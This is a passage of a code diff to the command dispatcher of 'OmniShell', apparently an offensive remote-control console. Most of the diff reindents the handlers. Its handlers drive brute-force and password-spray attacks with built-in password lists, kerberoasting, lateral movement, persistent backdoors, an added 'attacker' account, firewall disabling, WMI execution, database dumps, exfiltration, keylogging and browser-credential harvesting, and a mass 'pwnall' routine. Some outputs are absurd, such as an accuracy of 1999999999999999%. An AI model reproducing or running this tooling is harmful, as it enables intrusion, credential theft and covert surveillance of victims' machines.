-                    if self.control and hasattr(self.control, 'shutdown'):
+                if self.control and hasattr(self.control, 'shutdown'):
                     self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "shutdown")
-                        print(f"[+] Shutdown sent to {target}")
+                    print(f"[+] Shutdown sent to {target}")
 
-                elif cmd == "reboot":
-                    target = args[0] if args else self.selected_target
+            elif cmd == "reboot":
+                target = args[0] if args else self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'shutdown'):
+                if self.control and hasattr(self.control, 'shutdown'):
                     self.control.shutdown(target, self.credentials["user"], self.credentials["pass"], "reboot")
-                        print(f"[+] Reboot sent to {target}")
+                    print(f"[+] Reboot sent to {target}")
 
             # ==================== FILES ====================
-                elif cmd == "upload" and len(args) >= 1:
-                    target = self.selected_target
+            elif cmd == "upload" and len(args) >= 1:
+                target = self.selected_target
                 src = args[0]
                 dst = args[1] if len(args) > 1 else "C$\\temp\\omni.exe"
                 
@@ -2637,16 +3013,16 @@ class OmniShell:
                     dst = args[2] if len(args) > 2 else "C$\\temp\\omni.exe"
                     
                 if not target or not src:
-                        print(f"{Fore.RED}[!] Usage: upload [ip] <src> <dst>")
+                    print(f"{Fore.RED}[!] Usage: upload [ip] <src> <dst>")
                     return
                     
-                    if self.control and hasattr(self.control, 'smb_upload'):
+                if self.control and hasattr(self.control, 'smb_upload'):
                     # Parsing dst for C$ etc if needed, but assuming simple path for now
                     self.control.smb_upload(target, src, "C$", dst.replace("C$\\", "").replace("C$:", ""), self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Uploaded to {target}")
+                    print(f"[+] Uploaded to {target}")
 
-                elif cmd == "download" and len(args) >= 1:
-                    target = self.selected_target
+            elif cmd == "download" and len(args) >= 1:
+                target = self.selected_target
                 remote = args[0]
                 local = args[1] if len(args) > 1 else "downloaded_file"
                 
@@ -2659,538 +3035,494 @@ class OmniShell:
                     self._log(f"{Fore.RED}[!] Usage: download [ip] <remote> <local>")
                     return
                     
-                    if self.control and hasattr(self.control, 'smb_download'):
+                if self.control and hasattr(self.control, 'smb_download'):
                     self.control.smb_download(target, "C$", remote.replace("C$\\", "").replace("C$:", ""), local, self.credentials["user"], self.credentials["pass"])
                     self._log(f"[+] Downloaded from {target}")
 
-                elif cmd == "file list" or (cmd == "file" and len(args) >= 1 and args[0] == "list"):
+            elif cmd == "file list" or (cmd == "file" and len(args) >= 1 and args[0] == "list"):
                 path = args[1] if len(args) > 1 else "C:\\"
-                    target = self.selected_target
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'remote_file_manager'):
+                if self.control and hasattr(self.control, 'remote_file_manager'):
                     result = self.control.remote_file_manager(target, self.credentials["user"], self.credentials["pass"], "list", path)
-                        print(f"{json.dumps(result, indent=2)}")
+                    print(f"{json.dumps(result, indent=2)}")
 
-                elif cmd == "file upload" or (cmd == "file" and len(args) >= 2 and args[0] == "upload"):
+            elif cmd == "file upload" or (cmd == "file" and len(args) >= 2 and args[0] == "upload"):
                 local = args[1]
                 remote = args[2] if len(args) > 2 else "C:\\temp\\" + os.path.basename(local)
-                    target = self.selected_target
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'smb_upload'):
+                if self.control and hasattr(self.control, 'smb_upload'):
                     self.control.smb_upload(target, local, "C$", remote.replace("C$\\", ""), self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] File uploaded")
+                    print(f"[+] File uploaded")
 
-                elif cmd == "file download" or (cmd == "file" and len(args) >= 2 and args[0] == "download"):
+            elif cmd == "file download" or (cmd == "file" and len(args) >= 2 and args[0] == "download"):
                 remote = args[1]
                 local = args[2] if len(args) > 2 else os.path.basename(remote)
-                    target = self.selected_target
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'smb_download'):
+                if self.control and hasattr(self.control, 'smb_download'):
                     self.control.smb_download(target, "C$", remote.replace("C$\\", ""), local, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] File downloaded")
+                    print(f"[+] File downloaded")
 
-                elif cmd == "file delete" or (cmd == "file" and len(args) >= 2 and args[0] == "delete"):
+            elif cmd == "file delete" or (cmd == "file" and len(args) >= 2 and args[0] == "delete"):
                 path = args[1]
-                    target = self.selected_target
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'remote_file_manager'):
+                if self.control and hasattr(self.control, 'remote_file_manager'):
                     self.control.remote_file_manager(target, self.credentials["user"], self.credentials["pass"], "delete", path)
-                        print(f"[+] File deleted")
+                    print(f"[+] File deleted")
 
-                elif cmd == "file execute" or (cmd == "file" and len(args) >= 2 and args[0] == "execute"):
+            elif cmd == "file execute" or (cmd == "file" and len(args) >= 2 and args[0] == "execute"):
                 path = args[1]
-                    target = self.selected_target
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'wmi_exec'):
+                if self.control and hasattr(self.control, 'wmi_exec'):
                     self.control.wmi_exec(target, self.credentials["user"], self.credentials["pass"], path)
-                        print(f"[+] Execution requested")
+                    print(f"[+] Execution requested")
 
-                elif cmd == "media play" or (cmd == "media" and len(args) >= 1 and args[0] == "play"):
+            elif cmd == "media play" or (cmd == "media" and len(args) >= 1 and args[0] == "play"):
                 file = args[1] if len(args) > 1 else ""
-                    target = self.selected_target
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'remote_media_control'):
+                if self.control and hasattr(self.control, 'remote_media_control'):
                     self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "play", file)
-                        print(f"[+] Media play command sent")
+                    print(f"[+] Media play command sent")
 
-                elif cmd == "media volume_up" or (cmd == "media" and len(args) >= 1 and args[0] == "volume_up"):
-                    target = self.selected_target
+            elif cmd == "media volume_up" or (cmd == "media" and len(args) >= 1 and args[0] == "volume_up"):
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'remote_media_control'):
+                if self.control and hasattr(self.control, 'remote_media_control'):
                     self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "volume_up", None)
-                        print(f"[+] Volume increased")
+                    print(f"[+] Volume increased")
 
-                elif cmd == "media volume_down" or (cmd == "media" and len(args) >= 1 and args[0] == "volume_down"):
-                    target = self.selected_target
+            elif cmd == "media volume_down" or (cmd == "media" and len(args) >= 1 and args[0] == "volume_down"):
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'remote_media_control'):
+                if self.control and hasattr(self.control, 'remote_media_control'):
                     self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "volume_down", None)
-                        print(f"[+] Volume decreased")
+                    print(f"[+] Volume decreased")
 
-                elif cmd == "media cd_open" or (cmd == "media" and len(args) >= 1 and args[0] == "cd_open"):
-                    target = self.selected_target
+            elif cmd == "media cd_open" or (cmd == "media" and len(args) >= 1 and args[0] == "cd_open"):
+                target = self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'remote_media_control'):
+                if self.control and hasattr(self.control, 'remote_media_control'):
                     self.control.remote_media_control(target, self.credentials["user"], self.credentials["pass"], "cd_open", None)
-                        print(f"[+] CD tray opened")
+                    print(f"[+] CD tray opened")
 
             # ==================== MISSING COMMANDS ====================
-                elif cmd == "ssh-exec" and len(args) >= 1:
-                    target = self.selected_target
+            elif cmd == "ssh-exec" and len(args) >= 1:
+                target = self.selected_target
                 cmd_to_run = " ".join(args)
                 if args[0].count('.') >= 3:
                     target = args[0]
                     cmd_to_run = " ".join(args[1:])
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'ssh_exec'):
+                if self.control and hasattr(self.control, 'ssh_exec'):
                     res = self.control.ssh_exec(target, self.credentials["user"], self.credentials["pass"], cmd_to_run)
-                        print(f"{res}")
+                    print(f"{res}")
 
-                elif cmd == "clipboard-get":
-                    target = args[0] if args else self.selected_target
+            elif cmd == "clipboard-get":
+                target = args[0] if args else self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'get_clipboard'):
+                if self.control and hasattr(self.control, 'get_clipboard'):
                     clip = self.control.get_clipboard(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"Clipboard: {clip}")
+                    print(f"Clipboard: {clip}")
 
-                elif cmd == "clipboard-set" and len(args) >= 1:
-                    target = self.selected_target
+            elif cmd == "clipboard-set" and len(args) >= 1:
+                target = self.selected_target
                 txt = " ".join(args)
                 if args[0].count('.') >= 3:
                     target = args[0]
                     txt = " ".join(args[1:])
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'set_clipboard'):
+                if self.control and hasattr(self.control, 'set_clipboard'):
                     self.control.set_clipboard(target, self.credentials["user"], self.credentials["pass"], txt)
-                        print(f"[+] Clipboard set")
+                    print(f"[+] Clipboard set")
 
-                elif cmd == "svc-list":
-                    target = args[0] if args else self.selected_target
+            elif cmd == "svc-list":
+                target = args[0] if args else self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'list_services'):
+                if self.control and hasattr(self.control, 'list_services'):
                     svcs = self.control.list_services(target, self.credentials["user"], self.credentials["pass"])
                     Visualizer.table(["NAME", "STATUS", "STARTTYPE"], [[s.get('Name','?'), s.get('Status','?'), s.get('StartMode','?')] for s in svcs[:30]], "SERVICES")
 
-                elif cmd == "processes":
-                    target = args[0] if args else self.selected_target
+            elif cmd == "processes":
+                target = args[0] if args else self.selected_target
                 if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
+                    print(f"{Fore.RED}[!] No target selected.")
                     return
-                    if self.control and hasattr(self.control, 'list_processes'):
+                if self.control and hasattr(self.control, 'list_processes'):
                     procs = self.control.list_processes(target, self.credentials["user"], self.credentials["pass"])
                     Visualizer.table(["PID", "NAME", "MEM", "USER"], [[p.get('ProcessId','?'), p.get('Name','?'), p.get('WorkingSetSize','0'), p.get('User','?')] for p in procs[:30]], "PROCESSES")
 
-                elif cmd == "vnc-brute" and args:
-                    if self.control and hasattr(self.control, 'vnc_brute_force'):
+            elif cmd == "vnc-brute" and args:
+                if self.control and hasattr(self.control, 'vnc_brute_force'):
                     result = self.control.vnc_brute_force(args[0])
-                        print(f"{json.dumps(result, indent=2)}")
+                    print(f"{json.dumps(result, indent=2)}")
 
-                elif cmd == "telnet-brute" and args:
-                    if self.control and hasattr(self.control, 'telnet_brute_force'):
+            elif cmd == "telnet-brute" and args:
+                if self.control and hasattr(self.control, 'telnet_brute_force'):
                     result = self.control.telnet_brute_force(args[0])
-                        print(f"{json.dumps(result, indent=2)}")
+                    print(f"{json.dumps(result, indent=2)}")
 
-                elif cmd == "scan-exploit" and args:
-                ip_range = args[0]
-                    Visualizer.alert(f"Scan & exploit all hosts in {ip_range} ...", "hack")
-                    if self.control and hasattr(self.control, 'scan_and_exploit_network'):
-                    result = self.control.scan_and_exploit_network(ip_range)
-                    total = result.get("total_scanned", 0)
-                    owned = result.get("owned", 0)
-                        print(f"\n  {Fore.RED}{Style.BRIGHT}Scan-Exploit complete:")
-                        print(f"  {Fore.WHITE}  Hosts scanned : {total}")
-                        print(f"  {Fore.GREEN}{Style.BRIGHT}  Owned         : {owned}")
-                    hosts = result.get("hosts", [])
-                    for h in hosts:
-                        col = Fore.RED if h.get("owned") else Fore.WHITE
-                        print(f"  {col}  {h.get('ip','?'):<16} {h.get('method','')}")
-                        print()
-                elif self.universal:
-                    result = self.universal.discover_all_devices(ip_range)
-                        print(f"\n  Found {len(result)} hosts in {ip_range}")
-                    for d in result:
-                        print(f"  {Fore.CYAN}  {d.ip:<16} {getattr(d,'hostname','') or ''}")
+            elif cmd == "setdomain":
+                if args:
+                    self.credentials["domain"] = args[0]
+                    print(f"[+] Domain set to: {args[0]}")
+                else:
+                    print(f"Current domain: {self.credentials['domain'] or 'NONE'}")
 
-                elif cmd == "db-extract" and len(args) >= 3:
-                ip = args[0]
-                port = int(args[1])
-                db_type = args[2]
-                user = args[3] if len(args) > 3 else ""
-                pwd = args[4] if len(args) > 4 else ""
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  DATABASE EXTRACTION: {db_type.upper()} {ip}:{port}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.database_extract(ip, port, db_type, user, pwd)
-                    if result.get('connected'):
-                        HackerSounds.exploit_success()
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables found: {len(result.get('tables', []))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Rows extracted: {result.get('total_rows', 0)}")
-                    else:
-                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "cloud-attack" and len(args) >= 2:
-                service_type = args[0]
-                    target = args[1]
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  CLOUD SERVICE ATTACK: {service_type.upper()}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.cloud_service_attack(service_type, target)
-                    if result.get('vulnerable'):
-                        HackerSounds.exploit_success()
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ VULNERABILITY DETECTED")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Data accessible: {result.get('data_accessible')}")
-                    else:
-                        print(f"{Fore.YELLOW}  ⚠ Service not vulnerable")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "persist":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  PERSISTENT BACKDOOR INSTALLATION")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.establish_persistent_connection(target,
-                        self.credentials["user"],
-                        self.credentials["pass"])
-                    if result.get('backdoor_active'):
-                        HackerSounds.exploit_success()
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ BACKDOOR INSTALLED")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Methods: {', '.join(result.get('persistence_installed', []))}")
-                    else:
-                        print(f"{Fore.RED}  ❌ Persistence installation failed")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "persist-task":
-                    target = self.selected_target
-                task_name = args[0] if len(args) > 0 else "SystemUpdate"
-                task_path = args[1] if len(args) > 1 else "notepad.exe"
-                if len(args) > 0 and args[0].count('.') >= 3:
-                    target = args[0]
-                    task_name = args[1] if len(args) > 1 else "SystemUpdate"
-                    task_path = args[2] if len(args) > 2 else "notepad.exe"
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                    if self.control and hasattr(self.control, 'create_scheduled_task'):
-                    self.control.create_scheduled_task(target, self.credentials["user"], self.credentials["pass"], task_name, task_path)
-                        print(f"[+] Task {task_name} created on {target}")
-
-                elif cmd == "adduser":
-                    target = self.selected_target
-                u = args[0]
-                p = args[1] if len(args) > 1 else "Password123!"
-                if args[0].count('.') >= 3:
-                    target = args[0]
-                    u = args[1] if len(args) > 1 else "attacker"
-                    p = args[2] if len(args) > 2 else "Password123!"
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                    if self.control and hasattr(self.control, 'add_local_user'):
-                    self.control.add_local_user(target, self.credentials["user"], self.credentials["pass"], u, p)
-                        print(f"[+] User {u} created on {target}")
-
-                elif cmd == "rdp-enable":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                    if self.control and hasattr(self.control, 'enable_rdp'):
-                    self.control.enable_rdp(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] RDP enabled on {target}")
-
-                elif cmd == "firewall-off":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                    if self.control and hasattr(self.control, 'disable_firewall'):
-                    self.control.disable_firewall(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Firewall disabled on {target}")
-
-                elif cmd == "firewall-on":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                    if self.control and hasattr(self.control, 'enable_firewall'):
-                    self.control.enable_firewall(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"[+] Firewall enabled on {target}")
-
-                elif cmd == "firewall-add" and len(args) >= 2:
-                ip = args[0]
-                port = int(args[1])
-                    if self.control and hasattr(self.control, 'add_firewall_exception'):
-                    self.control.add_firewall_exception(ip, self.credentials["user"], self.credentials["pass"], port)
-                        print(f"[+] Firewall rule added for port {port}")
-
-                elif cmd == "password-spray" and args:
-                domain = args[0]
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  PASSWORD SPRAY ATTACK ON DOMAIN: {domain}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    users = ["administrator", "user", "admin", "guest", "support", "helpdesk", "service", "sql", "exchange", "sharepoint"]
-                    passwords = ["Password123!", "password", "admin", "123456", "Summer2026!", "Winter2025!", "Spring2026!"]
-                    result = self.control.password_spray(domain, users, passwords)
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Attempts made: {result.get('attempts', 0)}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Valid credentials: {len(result.get('valid_credentials', []))}")
-                    for cred in result.get('valid_credentials', []):
-                        print(f"{Fore.GREEN}    ✅ {cred}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "kerberoast" and args:
-                dc_ip = args[0]
-                domain = args[1] if len(args) > 1 else ""
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  KERBEROASTING ATTACK ON {dc_ip}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.kerberoast(dc_ip, domain)
-                    if result.get('success'):
-                        HackerSounds.exploit_success()
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ KERBEROAST SUCCESSFUL")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ SPNs found: {len(result.get('spn_found', []))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tickets extracted: {len(result.get('tickets_extracted', []))}")
-                    else:
-                        print(f"{Fore.RED}  ❌ Kerberoasting failed")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "lateral" and len(args) >= 2:
-                source = args[0]
-                    target = args[1]
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  LATERAL MOVEMENT: {source} → {target}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.lateral_movement(source, target, self.credentials)
-                    if result.get('success'):
-                        HackerSounds.exploit_success()
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ LATERAL MOVEMENT SUCCESSFUL")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Method used: {result.get('method_used')}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Session created: {result.get('session_created')}")
-                    else:
-                        print(f"{Fore.RED}  ❌ All methods failed")
-                        print(f"{Fore.YELLOW}  ⚠ Attempted: {', '.join(result.get('methods_attempted', []))}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "db-dump" and len(args) >= 3:
-                ip = args[0]
-                port = int(args[1])
-                db_type = args[2]
-                user = args[3] if len(args) > 3 else ""
-                pwd = args[4] if len(args) > 4 else ""
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  FULL DATABASE DUMP: {db_type.upper()} {ip}:{port}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.full_database_dump(ip, port, db_type, user, pwd)
-                    if result.get('connected'):
-                        HackerSounds.exploit_success()
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ CONNECTED SUCCESSFULLY")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Databases found: {len(result.get('databases', []))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Tables extracted: {result.get('tables_extracted', 0)}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Total rows: {result.get('total_rows', 0)}")
-                    else:
-                        print(f"{Fore.RED}  ❌ Connection failed: {result.get('error')}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "exfiltrate" and len(args) >= 2:
-                    target = args[0]
-                file_path = args[1]
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  DATA EXFILTRATION")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    result = self.control.data_exfiltration(target, file_path)
-                    if result.get('success'):
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ EXFILTRATION COMPLETE")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Bytes transferred: {result.get('bytes_transferred', 0)}")
-                    else:
-                        print(f"{Fore.RED}  ❌ Exfiltration failed")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "live":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                duration = int(args[1]) if len(args) > 1 else 60
-                        print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  LIVE MONITORING ACTIVATED ON {target}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Screen stream active")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Keylogger active")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Audio capture active")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Duration: {duration} seconds")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-                    if self.control:
-                    self.control.live_monitor(target, self.credentials["user"], self.credentials["pass"], duration)
-
-                elif cmd == "harvest":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                        print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "extract":
-                    target = args[0] if args else self.selected_target
-                if not target:
-                        print(f"{Fore.RED}[!] No target selected.")
-                    return
-                        print(f"{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  FULL DATA EXTRACTION FROM {target}")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                    if self.control:
-                    data = self.control.extract_all_data(target, self.credentials["user"], self.credentials["pass"])
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser passwords: {len(data.get('credentials', []))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ WiFi networks: {len(data.get('wifi', {}))}")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Cookies extracted")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Browser history: {len(data.get('browser_data', {}))}")
-                        print(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "attack":
-                HackerSounds.alert()
-                MatrixEffects.target_lock()
-                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
-                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                total = len(self.hosts)
-                compromised = 0
-                for i, host in enumerate(self.hosts):
-                    try:
-                        ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
-                        self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
-                        if self.universal:
-                            device = self.universal.devices.get(ip)
-                            if device:
-                                self.universal._scan_device(device)
-                                if device.can_pwn:
-                                    compromised += 1
-                                    self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
-                    except Exception as e:
-                        self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
-                HackerSounds.exploit_success()
-                self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
-                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "pwnall":
-                HackerSounds.alert()
-                MatrixEffects.target_lock()
-                self._log(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                self._log(f"{Fore.GREEN}║  GLOBAL NETWORK ASSAULT INITIATED")
-                self._log(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                total = len(self.hosts)
-                compromised = 0
-                for i, host in enumerate(self.hosts):
-                    try:
-                        ip = host.get('ip') if isinstance(host, dict) else getattr(host, 'ip', str(host))
-                        self._log(f"{Fore.LIGHTGREEN_EX}  ⟶ [{i+1}/{total}] Targeting {ip}...")
-                        if self.universal:
-                            device = self.universal.devices.get(ip)
-                            if device:
-                                self.universal._scan_device(device)
-                                if device.can_pwn:
-                                    compromised += 1
-                                    self._log(f"{Fore.GREEN}    ✅ COMPROMISED: {ip}")
-                    except Exception as e:
-                        self._log(f"{Fore.RED}    ❌ Failed: {str(e)[:30]}")
-                HackerSounds.exploit_success()
-                self._log(f"\n{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                self._log(f"{Fore.LIGHTGREEN_EX}  OPERATION COMPLETE")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Total targets    : {total}")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Compromised      : {compromised}")
-                self._log(f"{Fore.LIGHTGREEN_EX}  Success rate     : {int((compromised/total)*100) if total > 0 else 0}%")
-                self._log(f"{Fore.GREEN}╚════════════════════════════════════════════════════════════╝\n")
-
-                elif cmd == "globalscan":
-                        print(f"\n{Fore.GREEN}╔════════════════════════════════════════════════════════════╗")
-                        print(f"{Fore.GREEN}║  ULTRAMAX GLOBAL NETWORK SCAN ACTIVATED")
-                        print(f"{Fore.GREEN}╠════════════════════════════════════════════════════════════╣")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Scanning ALL networks within 10km radius")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ PAN/Bluetooth/WiFi Direct detection active")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Mobile device auto-exploitation enabled")
-                        print(f"{Fore.LIGHTGREEN_EX}  ✅ Accuracy: 1999999999999999%")
